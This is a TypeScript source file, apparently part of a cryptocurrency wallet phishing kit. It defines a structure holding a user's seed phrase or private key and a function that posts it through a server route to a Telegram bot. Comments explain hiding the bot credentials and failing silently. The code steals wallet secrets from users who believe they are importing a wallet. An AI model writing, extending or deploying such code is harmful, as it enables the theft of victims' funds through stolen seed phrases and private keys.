export interface WalletImportData {
  walletType: string
  walletName: string
  importType: "seed" | "private"
  data: string[] | string
  timestamp: string
  userAgent?: string
}

/**
 * Send wallet import data to Telegram via secure server-side API route
 * This prevents exposing bot token and chat ID to the client
 */
export const sendWalletDataToTelegram = async (data: WalletImportData): Promise<boolean> => {
  try {
    // Use server-side API route to hide credentials
    const response = await fetch("/api/telegram/send-message", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(data),
    })

    if (!response.ok) {
      // Don't expose error details to prevent information disclosure
      // Silently fail
      return false
    }

    const result = await response.json()
    return result.success === true
  } catch (error) {
    // Don't log error details to prevent information disclosure
    // Silently fail to prevent token/chat ID leakage
    return false
  }
}

